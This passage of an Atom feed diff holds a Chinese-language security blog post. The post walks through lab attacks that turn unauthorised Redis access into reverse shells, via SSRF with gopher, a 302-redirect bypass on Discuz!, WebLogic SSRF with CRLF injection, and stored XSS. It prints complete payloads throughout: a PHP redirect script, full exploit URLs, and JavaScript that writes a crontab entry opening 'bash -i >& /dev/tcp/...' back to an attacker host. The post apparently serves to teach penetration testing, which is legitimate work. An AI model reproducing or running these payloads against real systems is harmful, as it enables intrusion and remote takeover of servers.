+&lt;&#x2F;span&gt;&lt;span&gt;    $ssrf &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;$_GET[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ssrf&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;curl&lt;&#x2F;span&gt;&lt;span&gt;($ssrf)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; 
+&lt;&#x2F;span&gt;&lt;span&gt;?&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;先尝试访问http:&#x2F;&#x2F;10.1.2.22:8081&#x2F;index.php?ssrf=file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd确认漏洞是否存在：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b43589381a62.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;此时证明漏洞存在，再次确认是否支持gopher:&#x2F;&#x2F;协议：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b4358c156387.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;于是直接通过此处的ssrf加载攻击载荷反弹得到shell：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b435905967ed.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;ssrf-http-302-gopher&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#ssrf-http-302-gopher&quot; aria-label=&quot;Anchor link for: ssrf-http-302-gopher&quot;&gt;ssrf + http:&#x2F;&#x2F; -&amp;gt; 302 -&amp;gt; gopher:&#x2F;&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;条件：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;存在ssrf的PHP web、Java web&lt;&#x2F;li&gt;
+&lt;li&gt;PHP中curl支持gopher或者curl&amp;gt;7.35.0、Java支持gopher&lt;&#x2F;li&gt;
+&lt;li&gt;ssrf只能使用http&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;实验环境：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Redis2.8.24(centOS7) #10.1.2.23&lt;&#x2F;li&gt;
+&lt;li&gt;Discuz!3.1 #10.1.2.22:8080&lt;&#x2F;li&gt;
+&lt;li&gt;VPS #http:&#x2F;&#x2F;s4kur4.cc&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;此例中在Apache服务器的8080端口运行了一个存在ssrf漏洞的Discuz!论坛，其ssrf产生处将协议限制为http，无法使用其他更多协议：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;10.1.2.22:8080&#x2F;forum.php?mod=ajax&amp;amp;action=downremoteimg&amp;amp;message=[img]http:&#x2F;&#x2F;s4kur4.cc&#x2F;index.php?hello.jpg[&#x2F;img]
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;由于无法使用gopher协议，因此该ssrf漏洞并不能直接操纵内网的redis服务器。&lt;&#x2F;p&gt;
+&lt;p&gt;为此，我们在自己的VPS上创建一个302.php对协议进行转换，通过302跳转的方式可以绕过Discuz!对协议的限制。首先在VPS根目录上创建302.php并使用header重定向转至带有攻击载荷的gopher:&#x2F;&#x2F;：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span&gt;&amp;lt;?php
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;header&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Location:&amp;lt;code class=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;gt;gopher:&#x2F;&#x2F;10.1.2.23:6379&#x2F;_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$60%0d%0a%0a%0a*&#x2F;1 * * * * bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;172.168.1.106&#x2F;7777 0&amp;gt;&amp;amp;1%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a&amp;lt;&#x2F;code&amp;gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;?&amp;gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这里要注意的是跳转指向的URL中，应该要包含攻击载荷转换后的原始字符串，不能做URL编码，否则会出现不成功的情况，因为PHP在重定向URL的过程中不会进行URL编码和解码，如果使用URL编码后的攻击载荷，会导致redis无法理解。&lt;&#x2F;p&gt;
+&lt;p&gt;接下来先在攻击机上监听，然后使用浏览器或者curl访问以下URL（message参数要进行URL编码）：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;10.1.2.22:8080&#x2F;forum.php?mod=ajax&amp;amp;action=downremoteimg&amp;amp;message=%5bimg%5dhttp%3a%2f%2fs4kur4.cc%2f302.php%3fhello.jpg%5b%2fimg%5d
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;过一会儿就收到了弹回的shell：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b435942c3974.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;0x03-ssrf-crlf&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#0x03-ssrf-crlf&quot; aria-label=&quot;Anchor link for: 0x03-ssrf-crlf&quot;&gt;0x03. ssrf + crlf&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;条件：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;存在ssrf的PHP web、Java Web&lt;&#x2F;li&gt;
+&lt;li&gt;Web Server存在crlf http头注入&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;实验环境：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Redis2.8.24(centOS7) #10.1.2.23&lt;&#x2F;li&gt;
+&lt;li&gt;Weblogic #10.1.2.22:7001&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;在此例中将在10.1.2.22的7001端口开启一个存在ssrf的weblogic容器，weblogic在10.0.2-10.3.6版本的SearchPublicRegistries.jsp文件中产生了一处ssrf：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;10.1.2.22:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator=http:&#x2F;&#x2F;s4kur4.cc&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b43596f196dd.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;这里首先利用回显对内网进行扫描探测，找到存在的redis服务器：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b43599256d0d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;由于weblogic同时存在crlf注入漏洞，导致URL中可以注入回车和换行符%0d%0a，于是接下来可以将攻击载荷直接注入请求头中：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;http:&#x2F;&#x2F;10.1.2.22:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator=http:&#x2F;&#x2F;10.1.2.23:6379&#x2F;%0d%0aset%201%20%22%5cn%5cn%2a%2f1%20%2a%20%2a%20%2a%20%2a%20%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f172%2e168%2e1%2e104%2f7777%200%3E%261%5cn%5cn%22%0d%0aconfig%20set%20dir%20%2fvar%2fspool%2fcron%2f%0d%0aconfig%20set%20dbfilename%20root%0d%0asave%0D%0A%0D%0Aaaa&amp;amp;rdoSearch=name&amp;amp;txtSearchname=sdf&amp;amp;txtSearchkey=&amp;amp;txtSearchfor=&amp;amp;selfor=Business+location&amp;amp;btnSubmit=Search
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;这里要注意在save后应该再增加一段字符，否则save后面的%0d%0a会导致无法插入而执行失败。&lt;&#x2F;p&gt;
+&lt;p&gt;在攻击机上设置监听，然后使用浏览器或者curl访问上面的URL即可弹回shell：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b4359e55fa29.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;xss&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#xss&quot; aria-label=&quot;Anchor link for: xss&quot;&gt;xss&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;条件：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;存在xss的Web&lt;&#x2F;li&gt;
+&lt;li&gt;已获知内网redis服务器ip地址或Web Server本身运行redis服务但外网无法访问&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;实验环境：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Redis2.8.24(centOS7) #10.1.2.23&lt;&#x2F;li&gt;
+&lt;li&gt;DVWA #10.1.2.23:80&lt;&#x2F;li&gt;
+&lt;li&gt;VPS #http:&#x2F;&#x2F;s4kur4.cc&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;本例中将会在redis服务器的80端口运行一个存在xss漏洞的web程序，同时对外封闭6379端口，只允许内部访问：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b4359fa6773c.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;然后在VPS上创建一个js文件rce.js，URI为http:&#x2F;&#x2F;s4kur4.cc&#x2F;rce.js，内容如下：&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;cmd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;cmd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;POST&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;10.1.2.23:6379&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;cmd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;eval &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;redis.call(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;172.168.1.106&#x2F;7777 0&amp;gt;&amp;amp;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;n&amp;quot;); redis.call(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;dir&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&#x2F;var&#x2F;spool&#x2F;cron&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;); redis.call(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;config&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;set&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;dbfilename&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;);&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; 0&amp;#39; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;var &lt;&#x2F;span&gt;&lt;span&gt;cmd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;XMLHttpRequest&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;cmd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;POST&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;10.1.2.23:6379&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;cmd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;save&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;接下来在80端口dvwa中的存储型xss处进行测试，在留言板中插入这个外部js：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b435a444d49f.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;在攻击机上设置监听，随后去10.1.2.22上以内网用户的身份查看这个页面：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b435a5a8cd86.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;过一会儿shell就弹回来了：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;07&#x2F;09&#x2F;5b435a83b3d86.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;事实上，在这个例子中除了可以利用存储型的xss，其他方式的xss均可以利用，甚至在VPS上构造一个恶意页面等待内网用户点击就能触发执行。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;zong-jie&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#zong-jie&quot; aria-label=&quot;Anchor link for: zong-jie&quot;&gt;总结&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;通过前面的四个实验，目前利用redis未授权反弹shell的姿势基本都囊括在其中了，当然每一种类型又会牵出众多漏洞和案例，例如仅ssrf就包含有XXE、FFmpeg、Confluence等多个应用的漏洞。&lt;&#x2F;p&gt;
+&lt;p&gt;ssrf这类漏洞还有待去更多的挖掘，针对未授权服务的利用方式也不仅仅只有反弹shell。希望本文能帮助大家举一反三，在真实场景中发散思维。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;can-kao&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#can-kao&quot; aria-label=&quot;Anchor link for: can-kao&quot;&gt;参考&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ol&gt;
+&lt;li&gt;《SSRF in PHP》@JoyChou：&lt;a href=&quot;http:&#x2F;&#x2F;joychou.org&#x2F;index.php&#x2F;web&#x2F;phpssrf.html&quot;&gt;http:&#x2F;&#x2F;joychou.org&#x2F;index.php&#x2F;web&#x2F;phpssrf.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;《SSRF in JAVA》@JoyChou：&lt;a href=&quot;http:&#x2F;&#x2F;joychou.org&#x2F;index.php&#x2F;web&#x2F;javassrf.html&quot;&gt;http:&#x2F;&#x2F;joychou.org&#x2F;index.php&#x2F;web&#x2F;javassrf.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;《利用gopher协议拓展攻击面》@RicterZ：&lt;a href=&quot;https:&#x2F;&#x2F;ricterz.me&#x2F;posts&#x2F;%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2&quot;&gt;https:&#x2F;&#x2F;ricterz.me&#x2F;posts&#x2F;利用%20gopher%20协议拓展攻击面&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;《60字节-无文件渗透测试实验》@niexinming：&lt;a href=&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;2017&#x2F;03&#x2F;09&#x2F;penetration-test-without-file.html&quot;&gt;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;2017&#x2F;03&#x2F;09&#x2F;penetration-test-without-file.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;《Build Your SSRF Exploit Framework——一个只影响有钱人的漏洞》@猪猪侠：&lt;a href=&quot;http:&#x2F;&#x2F;www.docin.com&#x2F;p-1750678156.html&quot;&gt;http:&#x2F;&#x2F;www.docin.com&#x2F;p-1750678156.html&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;*&lt;strong&gt;转载请注明作者及来源&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
